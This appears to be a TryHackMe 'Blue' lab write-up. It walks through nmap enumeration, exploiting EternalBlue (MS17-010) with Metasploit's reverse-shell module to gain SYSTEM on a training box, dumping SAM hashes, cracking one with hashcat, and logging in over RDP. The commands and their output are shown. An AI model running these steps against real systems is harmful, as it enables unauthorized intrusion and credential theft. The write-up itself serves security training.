# Try Hack Me - Blue

**Categories:** Windows, EternalBlue, MS17-010, CVE2017-0144  
**Difficulty:** Easy  

Commands used in this guide use the exported variable $IP (`export IP=10.10.212.70`) in place of the target machine's IP address.

## 1: Enumeration - nmap, smbclient

An initial nmap scan reveals 9 open ports but only 4 of these - 135 (RPC), 139 (NetBIOS), 445 (SMB), 3389 (RDP) - are likely to be interesting, with ports in the 49XXX probably being artifacts of the box's VPC config.

```sh
kali@kali:~$ sudo nmap $IP
...snip...
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown
```

This port configuration and associated services probably indicates a Windows machine and we confirm this with a more detailed OS, ("-O"), service ("-sV") and vulnerability ("--script vuln") scan on the 4 discovered services :

```sh
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  tcpwrapped
|_sslv2-drown: 
...snip....
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%)
...snip....
Host script results:
...snip...
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
...snip...
```

So we are able to confirm that this is likely a Windows 7 machine and the service information we get back is not great (no version information), but obviously there is a pretty big red flag here : the machine is apparently running an unpatched version of SMBv1 vulnerable to CVE-2017-0143 / ms17-010, better known as [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue).

There is more to investigate here - we could check if the SMB shares allow for anonymous access or are brute forceable, we could try to find more information on the RDP version, etc. - but for now we'll continue with EternalBlue.

## 2: Foothold - metasploit

Given the relative complexity of the EternalBlue vulnerability, we'll be using the [ms17_010_eternalblue](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/) module provided by metasploit to perform the exploit. After having loaded the module in msfconsole and configured the RHOSTS and LHOST paramters, we run the exploit : 

```sh
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
                                               
[*] Started reverse TCP handler on 10.6.76.88:4444                                            
[*] 10.10.212.70:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check                      
[+] 10.10.212.70:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.212.70:445      - Scanned 1 of 1 hosts (100% complete)                              
[+] 10.10.212.70:445 - The target is vulnerable.                   
[*] 10.10.212.70:445 - Connecting to target for exploitation. 
...snip...
[+] 10.10.212.70:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=          
[+] 10.10.212.70:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=          
[+] 10.10.212.70:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

Dropping down into a shell and running some basic post-exploitation enum shows that we already have AUTHORITY\SYSTEM level privileges :


```sh
meterpreter > shell
Process 1896 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>hostname && whoami
Jon-PC
nt authority\system
```

## 3. Persistence  - hashdump, hashcat

From here, we can perform any number of post-exploitation activities (the room pays particular attention to process migration to ensure that our user and process privileges are both AUTHORITY\SYSTEM level) - listing, modifying and creating user accounts, exfiltrating data, setting up persistent access and C2, etc. We'll focus on persistent access through extracting and cracking password hashes. Windows machines store local user password hashes in the [Security Account Manager (SAM) registry hive](https://en.wikipedia.org/wiki/Security_Account_Manager), which is readable by AUTHORITY\SYSTEM level users. We can use Metasploit's [hashdump](https://www.rapid7.com/blog/post/2010/01/01/safe-reliable-hash-dumping/) module to extract these hashes by dropping out of the shell session and running "hashdump" in the meterpreter console :

```sh
C:\Windows\system32>^C
Terminate channel 1? [y/N]  y 
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

The result has one line for each user, structured as follows :

```sh
USERNAME:USER_RID:LM_HASH:NTLM_HASH 
```

The eagle-eyed among you will notice that the LM hash is the same for the 3 user accounts - this is because LM password hashes were deprecated in Windows Vista and are not set for users on later distributions. You might also notice that the Guest and Administrator NTLM hashes are the same and this is again the default hash used for a user that does not have an NTLM password set. What interests us here then is the NTLM hash for the user Jon. Saving the hashdump output to a file "hash.txt", we can run hashcat in NTLM mode (-m 1000) to attempt to crack Jon's password hash :

```sh
┌──(kali㉿kali)-[~]
└─$ hashcat -m 1000 -a 0 hash.txt rockyou
hashcat (v6.1.1) starting...

...snip...

Dictionary cache hit:
* Filename..: rockyou
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

31d6cfe0d16ae931b73c59d7e0c089c0:
ffb43f0de35be4d9917ac0cc8ad57f8d:PASSWORD
                                                 
Session..........: hashcat
Status...........: Cracked

...snip...

```

Hashcat successfully finds Jon's password after just a few minutes. We can use the RDP service discovered in section 1 to test that the discovered password is correct and provides persistent access to the machine :

```sh
┌──(kali㉿kali)-[~]
└─$ xfreerdp /v:$IP /u:Jon /p:PASSWORD
```

There's no easy way to show this in text only format, but the RDP access is successful - we now have persistent, password-based access to a user in the local "Administrators" groups.